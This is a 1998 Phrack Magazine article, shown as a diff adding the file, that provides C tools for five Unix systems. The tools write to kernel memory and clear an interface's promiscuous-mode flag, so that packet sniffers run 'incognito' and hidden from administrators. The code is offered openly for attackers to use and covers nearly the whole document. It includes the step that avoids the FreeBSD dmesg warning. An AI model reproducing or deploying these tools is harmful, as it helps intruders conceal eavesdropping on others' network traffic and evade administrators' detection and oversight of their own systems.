@@ -1,0 +1,994 @@
+---[  Phrack Magazine   Volume 8, Issue 53 July 8, 1998, article 10 of 15
+
+
+-------------------------[  Interface Promiscuity Obscurity
+
+
+--------[  apk <apk@itl.waw.pl>
+
+
+
+----[  INTRODUCTION
+
+Normally, when you put an interface into promiscuous mode, it sets a flag
+in the device interface structure telling the world (or anyone who wants
+to check) that the device, is indeed, in promiscuous mode.  This is, of
+course, annoying to those of you who want to obscure this fact from prying
+administrative eyes.  Behold intrepid hacker, your salvation is at hand.
+The following modules for FreeBSD, Linux, HP-UX, IRIX and Solaris allow you
+to obscure the IFF_PROMISC bit and run all your wonderful little packet
+sniffers incognito...
+
+
+----[  IMPLEMENTATION DETAILS
+
+Usage of the code is simple.  After you put the interface into promiscuous
+mode, you can clean the IFF_PROMISC flag with:
+
+    `./i <interface> 0`
+
+and reset the flag with:
+
+    `./i <interface> 1`.
+
+Note that these programs only change interface's flag value, they don't affect
+NIC status.  On systems which allow setting promiscuous mode by SIOCSIFFLAGS
+however, any call to SIOCSIFFLAGS will make the change take effect (e.g. after
+clearing promisc flag:
+
+    'ifconfig <interface> up'
+
+will really turn off promiscuous mode).  Systems for which above is true are:
+FreeBSD, Linux, Irix.  On these three you can run a sniffer in non-promiscuous
+mode, and then some time later set IFF_PROIMISC on the interface, then with
+the above command set promiscuous mode for interface.  This is most useful on
+FreeBSD because in doing this you won't get that annoying `promiscuous mode
+enabled for <interface>' message in the dmesg buffer (it's only logged when
+you enable promiscuous mode via bpf by BIOCPROMISC).
+
+On Solaris, every alias has its own flags, so you can set flags for any alias:
+
+    'interface[:<alias number>]'
+
+(because Solaris doesn't set IFF_PROMISC when you turn on promiscuous mode
+using DLPI you don't need this program however).
+
+
+----[  THE CODE
+
+<++> EX/promisc/freebsd-p.c
+/*
+ *  promiscuous flag changer v0.1, apk
+ *  FreeBSD version, compile with -lkvm
+ *
+ *  usage: promisc [interface 0|1]
+ *
+ *  note:  look at README for notes
+ */
+
+#ifdef __FreeBSD__
+# include <osreldate.h>
+# if __FreeBSD_version >= 300000
+#  define FBSD3
+# endif
+#endif
+
+#include <sys/types.h>
+#include <sys/time.h>
+
+#include <sys/socket.h>
+#include <net/if.h>
+#ifdef FBSD3
+# include <net/if_var.h>
+#endif
+
+#include <kvm.h>
+#include <nlist.h>
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <errno.h>
+#include <string.h>
+#include <fcntl.h>
+#include <unistd.h>
+
+#define IFFBITS \
+"\1UP\2BROADCAST\3DEBUG\4LOOPBACK\5POINTOPOINT\6NOTRAILERS\7RUNNING" \
+"\10NOARP\11PROMISC\12ALLMULTI\13OACTIVE\14SIMPLEX\15LINK0\16LINK1\17LINK2" \
+"\20MULTICAST"
+
+struct nlist nl[] = {
+	{ "_ifnet" },
+#define N_IFNET 0
+	{ "" }
+};
+
+int kread(kvm_t *kd, u_long addr, void *buf, int len) {
+  int c;
+
+  if ((c = kvm_read(kd, addr, buf, len)) != len) 
+    return -1;
+  return c;
+}
+
+int kwrite(kvm_t *kd, u_long addr, void *buf, int len) {
+  int c;
+
+  if ((c = kvm_write(kd, addr, buf, len)) != len) 
+    return -1;
+  return c;
+}
+
+void usage(char *s) {
+  printf("usage: %s [interface 0|1]\n", s);
+  exit(1);
+}
+
+int main(int argc, char *argv[]) {
+#ifdef FBSD3
+  struct ifnethead ifh;
+#endif
+  struct ifnet ifn, *ifp;
+  char ifname[IFNAMSIZ];
+  int unit, promisc, i, any;
+  char *interface, *cp;
+  kvm_t *kd;
+
+  switch (argc) {
+    case 1:
+	promisc = -1;
+	interface = NULL;
+	break;
+    case 3:
+    	interface = argv[1];
+    	if ((cp = strpbrk(interface, "1234567890")) == NULL) {
+      	  printf("bad interface name: %s\n", interface);
+          exit(1);
+        }
+        unit = strtol(cp, NULL, 10);
+        *cp = 0;
+	promisc = atoi(argv[2]);
+	break;
+    default:
+	usage(argv[0]);
+  }
+
+  if ((kd = kvm_open(NULL, NULL, NULL, O_RDWR, argv[0])) == NULL) 
+    exit(1);
+
+  if (kvm_nlist(kd, nl) == -1) {
+    perror("kvm_nlist");
+    exit(1);
+  }
+
+  if (nl[N_IFNET].n_type == 0) {
+    printf("Cannot find symbol: %s\n", nl[N_IFNET].n_name);
+    exit(1);
+  }
+
+#ifdef FBSD3
+  if (kread(kd, nl[N_IFNET].n_value, &ifh, sizeof(ifh)) == -1) {
+    perror("kread");
+    exit(1);
+  }
+  ifp = ifh.tqh_first;
+#else
+  if (kread(kd, nl[N_IFNET].n_value, &ifp, sizeof(ifp)) == -1) {
+    perror("kread");
+    exit(1);
+  }
+  if (kread(kd, (u_long)ifp, &ifp, sizeof(ifp)) == -1) {
+    perror("kread");
+    exit(1);
+  }
+#endif
+
+#ifdef FBSD3
+  for (; ifp; ifp = ifn.if_link.tqe_next) {
+#else
+  for (; ifp; ifp = ifn.if_next) {
+#endif
+    if (kread(kd, (u_long)ifp, &ifn, sizeof(ifn)) == -1) {
+      perror("kread");
+      break;
+    }
+    if (kread(kd, (u_long)ifn.if_name, ifname, sizeof(ifname)) == -1) {
+      perror("kread");
+      break;
+    }
+    printf("%d: %s%d, flags=0x%x ", ifn.if_index, ifname, ifn.if_unit, 
+	   (unsigned short)ifn.if_flags);
+    /* this is from ifconfig sources */
+    cp = IFFBITS;
+    any = 0;
+    putchar('<');
+    while ((i = *cp++) != 0) {
+      if (ifn.if_flags & (1 << (i-1))) {
+	if (any)
+	  putchar(',');
+	any = 1;
+	for (; *cp > 32; )
+	  putchar(*cp++);
+      } else 
+	for (; *cp > 32; cp++)
+	  ;
+    }
+    putchar('>');
+    putchar('\n');
+    if (interface && strcmp(interface, ifname) == 0 && unit == ifn.if_unit) {
+      switch (promisc) {
+	case -1: 
+		break;
+        case 0: if ((ifn.if_flags & IFF_PROMISC) == 0)
+		  printf("\tIFF_PROMISC not set\n");
+                else {
+		  printf("\t%s%d: clearing IFF_PROMISC\n", ifname, unit);
+		  ifn.if_flags &= ~IFF_PROMISC;
+      		  if (kwrite(kd, (u_long)ifp, &ifn, sizeof(ifn)) == -1) 
+                    perror("kwrite");
+                }
+	      break;
+	default: if ((ifn.if_flags & IFF_PROMISC) == IFF_PROMISC)
+		  printf("\tIFF_PROMISC set already\n");
+                else {
+	          printf("\t%s%d: setting IFF_PROMISC\n", ifname, unit);
+		  ifn.if_flags |= IFF_PROMISC;
+      		  if (kwrite(kd, (u_long)ifp, &ifn, sizeof(ifn)) == -1) 
+                    perror("kwrite");
+                }
+                break;
+
+      }
+    }
+  }
+}
+<-->
+<++> EX/promisc/hpux-p.c
+/*
+ *  promiscuous flag changer v0.1, apk
+ *  HP-UX version, on HP-UX 9.x compile with -DHPUX9
+ *
+ *  usage: promisc [interface 0|1]
+ *
+ *  note:  look at README for notes
+ */
+
+/* #define HPUX9 on HP-UX 9.x */
+
+#include <sys/types.h>
+#include <sys/socket.h>
+
+#include <net/if.h>
+
+#include <nlist.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <errno.h>
+#include <string.h>
+#include <fcntl.h>
+#include <unistd.h>
+
+#ifndef HPUX9
+# define PATH_VMUNIX "/stand/vmunix"
+#else
+# define PATH_VMUNIX "/hp-ux"
+#endif
+
+#define PATH_KMEM "/dev/kmem"
+#define IFFBITS \
+"\1UP\2BROADCAST\3DEBUG\4LOOPBACK\5POINTOPOINT\6NOTRAILERS\7RUNNING" \
+"\10NOARP\11PROMISC\12ALLMULTI\13LOCALSUBNETS\14MULTICAST\15CKO\16xNOACC"
+
+struct nlist nl[] = {
+	{ "ifnet" },
+#define N_IFNET 0
+	{ "" }
+};
+
+int kread(fd, addr, buf, len) 
+int fd, len;
+off_t addr;
+void *buf;
+{
+  int c;
+
+  if (lseek(fd, addr, SEEK_SET) == -1) 
+    return -1;
+  if ((c = read(fd, buf, len)) != len) 
+    return -1;
+  return c;
+}
+
+int kwrite(fd, addr, buf, len) 
+int fd, len;
+off_t addr;
+void *buf;
+{
+  int c;
+
+  if (lseek(fd, addr, SEEK_SET) == -1) 
+    return -1;
+  if ((c = write(fd, buf, len)) != len) 
+    return -1;
+  return c;
+}
+
+void usage(s) 
+char *s;
+{
+  printf("usage: %s [interface 0|1]\n", s);
+  exit(1);
+}
+
+main(argc, argv) 
+int argc;
+char **argv;
+{
+  struct ifnet ifn, *ifp;
+  char ifname[IFNAMSIZ];
+  int fd, unit, promisc, i, any;
+  char *interface, *cp;
+
+  switch (argc) {
+    case 1:
+	promisc = -1;
+	interface = NULL;
+	break;
+    case 3:
+    	interface = argv[1];
+    	if ((cp = strpbrk(interface, "1234567890")) == NULL) {
+      	  printf("bad interface name: %s\n", interface);
+          exit(1);
+        }
+        unit = strtol(cp, NULL, 10);
+        *cp = 0;
+	promisc = atoi(argv[2]);
+	break;
+    default:
+	usage(argv[0]);
+  }
+
+  if (nlist(PATH_VMUNIX, nl) == -1) {
+    perror(PATH_VMUNIX);
+    exit(1);
+  }
+  if (nl[N_IFNET].n_type == 0) {
+    printf("Cannot find symbol: %s\n", nl[0].n_name);
+    exit(1);
+  }
+
+  if ((fd = open(PATH_KMEM, O_RDWR)) == -1) {
+    perror(PATH_KMEM);
+    exit(1);
+  }
+  if (kread(fd, nl[N_IFNET].n_value, &ifp, sizeof(ifp)) == -1) {
+    perror("kread");
+    exit(1);
+  }
+
+  for (; ifp; ifp = ifn.if_next) {
+    if (kread(fd, (u_long)ifp, &ifn, sizeof(ifn)) == -1) {
+      perror("kread");
+      break;
+    }
+    if (kread(fd, (u_long)ifn.if_name, ifname, sizeof(ifname)) == -1) {
+      perror("kread");
+      break;
+    }
+    printf("%d: %s%d, flags=0x%x ", ifn.if_index, ifname, ifn.if_unit, 
+	   ifn.if_flags);
+    cp = IFFBITS;
+    any = 0;
+    putchar('<');
+    while ((i = *cp++) != 0) {
+      if (ifn.if_flags & (1 << (i-1))) {
+	if (any)
+	  putchar(',');
+	any = 1;
+	for (; *cp > 32; )
+	  putchar(*cp++);
+      } else 
+	for (; *cp > 32; cp++)
+	  ;
+    }
+    putchar('>');
+    putchar('\n');
+    if (interface && strcmp(interface, ifname) == 0 && unit == ifn.if_unit) {
+      switch (promisc) {
+	case -1: 
+		break;
+        case 0: if ((ifn.if_flags & IFF_PROMISC) == 0)
+		  printf("\tIFF_PROMISC not set\n");
+                else {
+		  printf("\t%s%d: clearing IFF_PROMISC\n", ifname, unit);
+		  ifn.if_flags &= ~IFF_PROMISC;
+      		  if (kwrite(fd, (u_long)ifp, &ifn, sizeof(ifn)) == -1) 
+                    break;
+                }
+	      break;
+	default: if ((ifn.if_flags & IFF_PROMISC) == IFF_PROMISC)
+		  printf("\tIFF_PROMISC set already\n");
+                else {
+	          printf("\t%s%d: setting IFF_PROMISC\n", ifname, unit);
+		  ifn.if_flags |= IFF_PROMISC;
+      		  if (kwrite(fd, (u_long)ifp, &ifn, sizeof(ifn)) == -1) 
+                    break;
+                }
+
+      }
+    }
+  }
+}
+<-->
+<++> EX/promisc/irix-p.c
+/*
+ *  promiscuous flag changer v0.1, apk
+ *  Irix version, on Irix 6.x compile with -lelf, on 5.x with -lmld
+ *
+ *  usage: promisc [interface 0|1]
+ *
+ *  note: look at README for notes on irix64 compile with -DI64 -64
+ */
+
+/* #define I64 for Irix64*/
+
+#include <sys/types.h>
+#include <sys/socket.h>
+
+#include <net/if.h>
+
+#include <nlist.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <errno.h>
+#include <string.h>
+#include <fcntl.h>
+#include <unistd.h>
+
+#define PATH_VMUNIX "/unix"
+
+#define PATH_KMEM "/dev/kmem"
+#define IFFBITS \
+"\1UP\2BROADCAST\3DEBUG\4LOOPBACK\5POINTOPOINT\6NOTRAILERS\7RUNNING" \
+"\10NOARP\11PROMISC\12ALLMULTI\13LOCALSUBNETS\14MULTICAST\15CKO\16xNOACC"
+
+#ifdef I64
+struct nlist64 nl[] = {
+#else
+struct nlist nl[] = {
+#endif
+	{ "ifnet" },
+#define N_IFNET 0
+	{ "" }
+};
+
+int kread(int fd, off_t addr, void *buf, int len) {
+  int c;
+
+#ifdef I64
+  if (lseek64(fd, (off_t)addr, SEEK_SET) == -1) 
+#else
+  if (lseek(fd, (off_t)addr, SEEK_SET) == -1) 
+#endif
+    return -1;
+  if ((c = read(fd, buf, len)) != len) 
+    return -1;
+  return c;
+}
+
+int kwrite(int fd, off_t addr, void *buf, int len) {
+  int c;
+
+#ifdef I64
+  if (lseek64(fd, (off_t)addr, SEEK_SET) == -1) 
+#else
+  if (lseek(fd, (off_t)addr, SEEK_SET) == -1) 
+#endif
+    return -1;
+  if ((c = write(fd, buf, len)) != len) 
+    return -1;
+  return c;
+}
+
+void usage(s) 
+char *s;
+{
+  printf("usage: %s [interface 0|1]\n", s);
+  exit(1);
+}
+
+main(argc, argv) 
+int argc;
+char **argv;
+{
+  struct ifnet ifn, *ifp;
+  char ifname[IFNAMSIZ];
+  int fd, unit, promisc, i, any;
+  char *interface, *cp;
+
+  switch (argc) {
+    case 1:
+	promisc = -1;
+	interface = NULL;
+	break;
+    case 3:
+    	interface = argv[1];
+    	if ((cp = strpbrk(interface, "1234567890")) == NULL) {
+      	  printf("bad interface name: %s\n", interface);
+          exit(1);
+        }
+        unit = strtol(cp, NULL, 10);
+        *cp = 0;
+	promisc = atoi(argv[2]);
+	break;
+    default:
+	usage(argv[0]);
+  }
+
+#ifdef I64
+  if (nlist64(PATH_VMUNIX, nl) == -1) {
+#else
+  if (nlist(PATH_VMUNIX, nl) == -1) {
+#endif
+    perror(PATH_VMUNIX);
+    exit(1);
+  }
+  if (nl[N_IFNET].n_type == 0) {
+    printf("Cannot find symbol: %s\n", nl[0].n_name);
+    exit(1);
+  }
+
+  if ((fd = open(PATH_KMEM, O_RDWR)) == -1) {
+    perror(PATH_KMEM);
+    exit(1);
+  }
+  if (kread(fd, nl[N_IFNET].n_value, &ifp, sizeof(ifp)) == -1) {
+    perror("kread");
+    exit(1);
+  }
+
+  for (; ifp; ifp = ifn.if_next) {
+    if (kread(fd, (u_long)ifp, &ifn, sizeof(ifn)) == -1) {
+      perror("kread");
+      break;
+    }
+    if (kread(fd, (u_long)ifn.if_name, ifname, sizeof(ifname)) == -1) {
+      perror("kread");
+      break;
+    }
+    printf("%d: %s%d, flags=0x%x ", ifn.if_index, ifname, ifn.if_unit, 
+	   ifn.if_flags);
+    cp = IFFBITS;
+    any = 0;
+    putchar('<');
+    while ((i = *cp++) != 0) {
+      if (ifn.if_flags & (1 << (i-1))) {
+	if (any)
+	  putchar(',');
+	any = 1;
+	for (; *cp > 32; )
+	  putchar(*cp++);
+      } else 
+	for (; *cp > 32; cp++)
+	  ;
+    }
+    putchar('>');
+    putchar('\n');
+    if (interface && strcmp(interface, ifname) == 0 && unit == ifn.if_unit) {
+      switch (promisc) {
+	case -1: 
+		break;
+        case 0: if ((ifn.if_flags & IFF_PROMISC) == 0)
+		  printf("\tIFF_PROMISC not set\n");
+                else {
+		  printf("\t%s%d: clearing IFF_PROMISC\n", ifname, unit);
+		  ifn.if_flags &= ~IFF_PROMISC;
+      		  if (kwrite(fd, (u_long)ifp, &ifn, sizeof(ifn)) == -1) 
+                    break;
+                }
+	      break;
+	default: if ((ifn.if_flags & IFF_PROMISC) == IFF_PROMISC)
+		  printf("\tIFF_PROMISC set already\n");
+                else {
+	          printf("\t%s%d: setting IFF_PROMISC\n", ifname, unit);
+		  ifn.if_flags |= IFF_PROMISC;
+      		  if (kwrite(fd, (u_long)ifp, &ifn, sizeof(ifn)) == -1) 
+                    break;
+                }
+
+      }
+    }
+  }
+}
+<-->
+<++> EX/promisc/linux-p.c
+/*
+ *  promiscuous flag changer v0.1, apk
+ *  Linux version
+ *
+ *  usage: promisc [interface 0|1]
+ *
+ *  note:  look at README for notes
+ */
+
+#include <sys/types.h>
+#include <sys/socket.h>
+
+#include <net/if.h>
+#define __KERNEL__
+#include <linux/netdevice.h>
+#undef __KERNEL__
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <errno.h>
+#include <string.h>
+#include <fcntl.h>
+#include <unistd.h>
+
+#define HEAD_NAME "dev_base"
+#define PATH_KSYMS "/proc/ksyms"
+#define PATH_KMEM "/dev/mem"
+#define IFFBITS \
+"\1UP\2BROADCAST\3DEBUG\4LOOPBACK\5POINTOPOINT\6NOTRAILERS\7RUNNING" \
+"\10NOARP\11PROMISC\12ALLMULTI\13MASTER\14SLAVE\15MULTICAST"
+
+int kread(int fd, u_long addr, void *buf, int len) { 
+  int c;
+
+  if (lseek(fd, (off_t)addr, SEEK_SET) == -1) 
+    return -1;
+  if ((c = read(fd, buf, len)) != len) 
+    return -1;
+  return c;
+}
+
+int kwrite(int fd, u_long addr, void *buf, int len) { 
+  int c;
+
+  if (lseek(fd, (off_t)addr, SEEK_SET) == -1) 
+    return -1;
+  if ((c = write(fd, buf, len)) != len) 
+    return -1;
+  return c;
+}
+
+void usage(char *s) {
+  printf("usage: %s [interface 0|1]\n", s);
+  exit(1);
+}
+
+main(int argc, char *argv[]) {
+  struct device devn, *devp;
+  char ifname[IFNAMSIZ];
+  int fd, unit, promisc, i, any;
+  char *interface, *cp;
+  FILE *fp;
+  char line[256], symname[256];
+
+  switch (argc) {
+    case 1:
+	promisc = -1;
+	interface = NULL;
+	break;
+    case 3:
+        interface = argv[1];
+        unit = 0;
+        if ((cp = strchr(interface, ':')) != NULL) {
+          *cp++ = 0;
+          unit = strtol(cp, NULL, 10);
+        }
+        promisc = atoi(argv[2]);
+        break;
+    default:
+	usage(argv[0]);
+  }
+
+  if ((fp = fopen(PATH_KSYMS, "r")) == NULL) {
+    perror(PATH_KSYMS);
+    exit(1);
+  }
+
+  devp = NULL;
+  while (fgets(line, sizeof(line), fp) != NULL && 
+                                       sscanf(line, "%x %s", &i, symname) == 2)
+    if (strcmp(symname, HEAD_NAME) == 0) {
+      devp = (struct device *)i;
+      break;
+    }
+  fclose(fp);
+  if (devp ==  NULL) {
+    printf("Cannot find symbol: %s\n", HEAD_NAME);
+    exit(1);
+  }
+
+  if ((fd = open(PATH_KMEM, O_RDWR)) == -1) {
+    perror(PATH_KMEM);
+    exit(1);
+  }
+  if (kread(fd, (u_long)devp, &devp, sizeof(devp)) == -1) {
+    perror("kread");
+    exit(1);
+  }
+
+  for (; devp; devp = devn.next) {
+    if (kread(fd, (u_long)devp, &devn, sizeof(devn)) == -1) {
+      perror("kread");
+      break;
+    }
+    if (kread(fd, (u_long)devn.name, ifname, sizeof(ifname)) == -1) {
+      perror("kread");
+      break;
+    }
+    printf("%s: flags=0x%x ", ifname, devn.flags);
+    cp = IFFBITS;
+    any = 0;
+    putchar('<');
+    while ((i = *cp++) != 0) {
+      if (devn.flags & (1 << (i-1))) {
+	if (any)
+	  putchar(',');
+	any = 1;
+	for (; *cp > 32; )
+	  putchar(*cp++);
+      } else 
+	for (; *cp > 32; cp++)
+	  ;
+    }
+    putchar('>');
+    putchar('\n');
+    /* This sux */
+/*   if (interface && strcmp(interface, ifname) == 0 && unit == ifn.if_unit) {*/
+    if (interface && strcmp(interface, ifname) == 0) {
+      switch (promisc) {
+	case -1: 
+		break;
+        case 0: if ((devn.flags & IFF_PROMISC) == 0)
+		  printf("\tIFF_PROMISC not set\n");
+                else {
+		  printf("\t%s: clearing IFF_PROMISC\n", ifname);
+		  devn.flags &= ~IFF_PROMISC;
+      		  if (kwrite(fd, (u_long)devp, &devn, sizeof(devn)) == -1) 
+                    break;
+                }
+	      break;
+	default: if ((devn.flags & IFF_PROMISC) == IFF_PROMISC)
+		  printf("\tIFF_PROMISC set already\n");
+                else {
+	          printf("\t%s: setting IFF_PROMISC\n", ifname);
+		  devn.flags |= IFF_PROMISC;
+      		  if (kwrite(fd, (u_long)devp, &devn, sizeof(devn)) == -1) 
+                    break;
+                }
+
+      }
+    }
+  }
+}
+<-->
+<++> EX/promisc/socket-p.c
+/*
+ *  This is really dumb program.
+ *  Works on Linux, FreeBSD and Irix.
+ *  Check README for comments.
+ */
+
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/time.h>
+#include <sys/ioctl.h>
+#include <net/if.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(int argc, char *argv[]) {
+  int sd;
+  struct ifreq ifr;
+  char *interface;
+  int promisc;
+
+  if (argc != 3) {
+    printf("usage: %s interface 0|1\n", argv[0]);
+    exit(1);
+  }
+  interface = argv[1];
+  promisc = atoi(argv[2]);
+
+  if ((sd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
+    perror("socket");
+    exit(1);
+  }
+  strncpy(ifr.ifr_name, interface, IFNAMSIZ);
+  if (ioctl(sd, SIOCGIFFLAGS, &ifr) == -1) {
+    perror("SIOCGIFFLAGS");
+    exit(1);
+  }
+  printf("flags = 0x%x\n", (u_short)ifr.ifr_flags);
+  if (promisc)
+    ifr.ifr_flags |= IFF_PROMISC;
+  else
+    ifr.ifr_flags &= ~IFF_PROMISC;
+  if (ioctl(sd, SIOCSIFFLAGS, &ifr) == -1) {
+    perror("SIOCSIFFLAGS");
+    exit(1);
+  }
+  close(sd);
+}
+<-->
+<++> EX/promisc/solaris-p.c
+/*
+ *  promiscuous flag changer v0.1, apk
+ *  Solaris version, compile with -lkvm -lelf
+ *
+ *  usage: promisc [interface 0|1]
+ *  (interface has "interface[:<alias number>]" format, e.g. le0:1 or le0)
+ * 
+ *  note: look at README for notes because DLPI promiscuous request doesn't
+ *  set IFF_PROMISC this version is kinda useless. 
+ */
+
+#include <sys/types.h>
+#include <sys/time.h>
+
+#include <sys/stream.h>
+#include <sys/socket.h>
+#include <net/if.h>
+
+#define _KERNEL
+#include <inet/common.h>
+#include <inet/led.h>
+#include <inet/ip.h>
+#undef _KERNEL
+
+#include <kvm.h>
+#include <nlist.h>
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <errno.h>
+#include <string.h>
+#include <fcntl.h>
+#include <unistd.h>
+
+#define IFFBITS \
+"\1UP\2BROADCAST\3DEBUG\4LOOPBACK\5POINTOPOINT\6NOTRAILERS\7RUNNING" \
+"\10NOARP\11PROMISC\12ALLMULTI\13INTELLIGENT\14MULTICAST\15MULTI_BCAST" \
+"\16UNNUMBERED\17PRIVATE"
+
+struct nlist nl[] = {
+	{ "ill_g_head" },
+#define N_ILL_G_HEAD 0
+	{ "" }
+};
+
+int kread(kvm_t *kd, u_long addr, void *buf, int len) {
+  int c;
+
+  if ((c = kvm_read(kd, addr, buf, len)) != len) 
+    return -1;
+  return c;
+}
+
+int kwrite(kvm_t *kd, u_long addr, void *buf, int len) {
+  int c;
+
+  if ((c = kvm_write(kd, addr, buf, len)) != len) 
+    return -1;
+  return c;
+}
+
+void usage(char *s) {
+  printf("usage: %s [interface 0|1]\n", s);
+  exit(1);
+}
+
+int main(int argc, char *argv[]) {
+  ill_t illn, *illp;
+  ipif_t ipifn, *ipifp;
+  char ifname[IFNAMSIZ]; /* XXX IFNAMSIZ? */
+  int unit, promisc, i, any;
+  char *interface, *cp;
+  kvm_t *kd;
+
+  switch (argc) {
+    case 1:
+	promisc = -1;
+	interface = NULL;
+	break;
+    case 3:
+    	interface = argv[1];
+        unit = 0;
+    	if ((cp = strchr(interface, ':')) != NULL) {
+          *cp++ = 0;
+          unit = strtol(cp, NULL, 10);
+        }
+	promisc = atoi(argv[2]);
+	break;
+    default:
+	usage(argv[0]);
+  }
+
+  if ((kd = kvm_open(NULL, NULL, NULL, O_RDWR, argv[0])) == NULL) 
+    exit(1);
+
+  if (kvm_nlist(kd, nl) == -1) {
+    perror("kvm_nlist");
+    exit(1);
+  }
+
+  if (nl[N_ILL_G_HEAD].n_type == 0) {
+    printf("Cannot find symbol: %s\n", nl[N_ILL_G_HEAD].n_name);
+    exit(1);
+  }
+
+  if (kread(kd, nl[N_ILL_G_HEAD].n_value, &illp, sizeof(illp)) == -1) {
+    perror("kread");
+    exit(1);
+  }
+
+  for (; illp; illp = illn.ill_next) {
+    if (kread(kd, (u_long)illp, &illn, sizeof(illn)) == -1) {
+      perror("kread");
+      break;
+    }
+    if (kread(kd, (u_long)illn.ill_name, ifname, sizeof(ifname)) == -1) {
+      perror("kread");
+      break;
+    }
+    ipifp = illn.ill_ipif;
+    /* on Solaris you can set different flags for every alias, so we do */
+    for (; ipifp; ipifp = ipifn.ipif_next) {
+      if (kread(kd, (u_long)ipifp, &ipifn, sizeof(ipifn)) == -1) {
+        perror("kread");
+        break;
+      }
+      printf("%s:%d, flags=0x%x ", ifname, ipifn.ipif_id, ipifn.ipif_flags);
+      cp = IFFBITS;
+      any = 0;
+      putchar('<');
+      while ((i = *cp++) != 0) {
+        if (ipifn.ipif_flags & (1 << (i-1))) {
+          if (any)
+	    putchar(',');
+	  any = 1;
+	  for (; *cp > 32; )
+	    putchar(*cp++);
+        } else 
+  	  for (; *cp > 32; cp++)
+	    ;
+      }
+      putchar('>');
+      putchar('\n');
+      if (interface && strcmp(interface, ifname) == 0 && unit == ipifn.ipif_id){
+        switch (promisc) {
+          case -1: 
+		break;
+          case 0: if ((ipifn.ipif_flags & IFF_PROMISC) == 0)
+		  printf("\tIFF_PROMISC not set\n");
+                else {
+		  printf("\t%s:%d: clearing IFF_PROMISC\n", ifname, unit);
+		  ipifn.ipif_flags &= ~IFF_PROMISC;
+      		  if (kwrite(kd, (u_long)ipifp, &ipifn, sizeof(ipifn)) == -1) 
+                    perror("kwrite");
+                }
+	      break;
+	  default: if ((ipifn.ipif_flags & IFF_PROMISC) == IFF_PROMISC)
+		  printf("\tIFF_PROMISC set already\n");
+                else {
+	          printf("\t%s:%d: setting IFF_PROMISC\n", ifname, unit);
+		  ipifn.ipif_flags |= IFF_PROMISC;
+      		  if (kwrite(kd, (u_long)ipifp, &ipifn, sizeof(ipifn)) == -1) 
+                    perror("kwrite");
+                }
+                break;
+        }
+      }
+    }
+  }
+}
+<-->
+
+----[  EOF
+
